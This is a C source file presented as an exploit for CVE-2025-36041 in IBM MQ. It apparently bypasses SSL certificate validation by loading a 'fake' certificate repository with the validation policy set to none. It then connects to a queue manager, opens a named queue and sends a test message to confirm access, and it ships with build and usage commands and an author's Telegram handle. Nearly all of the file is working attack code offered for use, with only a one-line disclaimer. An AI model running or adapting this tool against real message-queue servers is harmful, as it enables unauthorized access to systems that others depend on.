/*
 * Filename     : exploit.c
 * Author       : Byte Reaper
 *
 * CVE          : CVE-2025-36041
 * Target       : IBM MQ (Message Queue) Service
 *
 * Description  :
 *   Exploit for CVE-2025-36041 vulnerability in IBM MQ:
 *
 *   - Allows bypassing SSL certificate validation by injecting a fake SSL certificate,
 *     enabling unauthorized client connection to IBM MQ server.
 *   - Utilizes MQCONNX with customized SSL configuration to force connection despite invalid cert.
 *   - Opens a target queue and sends a test message ("Hello MQ") to verify successful exploitation.
 *
 * Usage:
 *   gcc exploit.c argparse.c -o CVE-2025-36041 \
 *       -I/path/to/mqm/include \
 *       -L/path/to/mqm/lib -lmqm
 *
 *   ./CVE-2025-36041 \
 *       -p /path/to/fake/ssl \
 *       -n TARGET.QUEUE.NAME \
 *       -m QM1

 *
 * Notes:
 *   - Requires IBM MQ client libraries installed.
 *   - The "path" parameter points to the fake SSL KeyRepository location.
 *   - The "name" parameter specifies the target queue name.
 *   - Successful message sending confirms the bypass of SSL cert verification.
 *
 * Warning:
 *   - For authorized penetration testing and educational purposes only.
 *   - Unauthorized use is illegal.
 *
 * Dependencies:
 *   - IBM MQ Client SDK (headers and libraries)
 *   - argparse.h for command-line argument parsing
 */

 
#include <cmqc.h>     
#include <cmqstrc.h>  
#include <cmqcfc.h>    
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "argparse.h"


void fakessl(const char *path,
    const char *queue,
    const char *qmgr)
{

    MQHCONN hConn;
    MQHOBJ  hObj;
    MQLONG  compCode;
    MQLONG  reason;

    MQCHAR ChannelName[MQ_CHANNEL_NAME_LENGTH] = "SYSTEM.DEF.SVRCONN";
    MQCHAR conName[MQ_CONN_NAME_LENGTH] = "127.0.0.1(1414)";
    
    MQCNO cno = { MQCNO_DEFAULT };
    MQCD cd  = { MQCD_CLIENT_CONN_DEFAULT };
    MQSCO sco = { MQSCO_DEFAULT };
    MQOD od  = { MQOD_DEFAULT };
    cno.Version = MQCNO_VERSION_4;
    cd.Version = MQCD_VERSION_4; 
    strncpy(cd.ChannelName,
        ChannelName,
        MQ_CHANNEL_NAME_LENGTH - 1);
    cd.ChannelName[MQ_CHANNEL_NAME_LENGTH - 1] = '\0';
    strncpy(cd.ConnectionName,
        conName,
        MQ_CONN_NAME_LENGTH - 1);
    cd.ConnectionName[MQ_CONN_NAME_LENGTH - 1] = '\0';

    strncpy(sco.KeyRepository,
        path,
        sizeof(sco.KeyRepository) -1);
    sco.KeyRepository[sizeof(sco.KeyRepository)-1] = '\0'; 
    
    cno.ClientConnPtr = &cd;
    sco.CertificateValidationPolicy = MQCERT_VAL_POLICY_NONE;
    cno.Options = MQCNO_USE_SSL_CONFIG;
    cno.SSLConfigPtr = &sco;

    printf("\e[1;34m[+] Starting connection to IBM MQ...\n");
    MQCONNX(qmgr,
        &cno,
        &hConn,
        &compCode,
        &reason); 
    if (compCode == MQCC_OK)
    {
        printf("\e[1;34m[+] Fake SSL Send Successfully !\n");
        printf("\e[1;34m[+] Connected successfully !!\n");
        
        strncpy(od.ObjectName,
            queue,
            MQ_Q_NAME_LENGTH-1);
        od.ObjectName[MQ_Q_NAME_LENGTH-1] = '\0';
 
        od.ObjectType = MQOT_Q;

        MQOPEN(hConn,
            &od,
            MQOO_OUTPUT,
            &hObj,
            &compCode,
            &reason);
        if (compCode == MQCC_OK)
        {
            MQCHAR mes[] = "Hello MQ";
            MQMD m = { MQMD_DEFAULT };
            MQPMO pmo = { MQPMO_DEFAULT };
            
            MQPUT(hConn,
                hObj,
                &m,
                &pmo,
                strlen(mes),
                mes,
                &compCode,
                &reason);
            if (compCode == MQCC_OK)
            {
                printf("\e[1;34m[+] Message sent!\n");
            }
            else
            {
                printf("\e[1;31m[-] MQPUT failed: compCode %ld, reason %ld\n",
                    compCode,
                    reason);
                exit(1);
            }
            
            MQCLOSE(hConn,
                &hObj,
                MQCO_NONE,
                &compCode,
                &reason);
        }
        else
        {
            printf("\e[1;31m[-] MQOPEN failed: compCode %ld, reason %ld\n",
                compCode,
                reason);
                exit(1);
        }
        
        MQDISC(&hConn, &compCode, &reason);
    }
    else
    {
        printf("\e[1;31m[-] MQCONNX failed: compCode %ld, reason %ld\n",
            compCode,
            reason);
    }
    
}
int main(int argc,
    const char **argv)
{
    printf(
        "\e[1;31m"
        "#######  ##     ## ########  #######    #####    #######  ########          #######   #######    #####   ##           ## \n"
        "##    ## ##     ## ##       ##     ##  ##   ##  ##     ## ##               ##     ## ##     ##  ##   ##  ##    ##   ####\n"
        "##       ##     ## ##              ## ##     ##        ## ##                      ## ##        ##     ## ##    ##     ##\n"
        "##       ##     ## ######    #######  ##     ##  #######  #######  #######  #######  ########  ##     ## ##    ##     ##\n"
        "##        ##   ##  ##       ##        ##     ## ##              ##                ## ##     ## ##     ## #########    ##\n"
        "##    ##   ## ##   ##       ##         ##   ##  ##        ##    ##         ##     ## ##     ##  ##   ##        ##     ##\n"
        "######     ###    ######## #########   #####   #########  ######           #######   #######    #####         ##   ######\n"
                                                                                                           "\e[1;37m@Byte Reaper\n"
        "\n"                                                                                                    
    );
    
    printf("\e[1;35m\n[!] Don't forget to include the fake certificate properly and pass it in the -p argument.\n");
    printf("\e[1;35m[+] If you face any problem or want to suggest something, welcome. This is my account on Telegram.\n");
    printf("\e[1;37m==> @ByteReaper0\n"); 
    printf("\e[0;37m-----------------------------------------------------------------------------------------------------\n");
    const char *path = NULL;
    const char *queue = NULL;
    const char *qmgr = NULL;
    struct argparse_option options[] =
    {
        OPT_HELP(),
    OPT_STRING('p',
        "path",
        &path,
        "Enter Path Fake SSL"),
    OPT_STRING('n',
        "name",
        &queue,
        "Enter queue Name"),
    OPT_STRING('m',
        "qmgr",
        &qmgr,
        "Enter Queue Manager Name"),    
    OPT_END(),
    };
    struct argparse argparse;
    argparse_init(&argparse,
        options,
        NULL,
        0);
    argparse_parse(&argparse,
        argc,
        argv);
    if (!path)
    {
        printf("\e[1;31m[-] Please Enter Path for Fake SSL !!\n");
        printf("\e[1;36mExemple : ./CVE-2025-36041 -p /path/to/fake/ssl -n TARGET.QUEUE.NAME -m QM1 \n");

        exit(1);
    }
    if (!queue)
    {
        printf("\e[1;31m[-] Please Enter your queue name !!\n");
        printf("\e[1;36mExemple : ./CVE-2025-36041 -p /path/to/fake/ssl -n TARGET.QUEUE.NAME -m QM1 \n");
        exit(1);
    }
    if (!qmgr) 
    {
        printf("\e[1;31m[-] Please enter the Queue Manager name using -m !\n");
        printf("\e[1;36mExemple : ./CVE-2025-36041 -p /path/to/fake/ssl -n TARGET.QUEUE.NAME -m QM1 \n");
        exit(1);
    }
    
    fakessl(path,
        queue,
        qmgr);

    return 0;
}


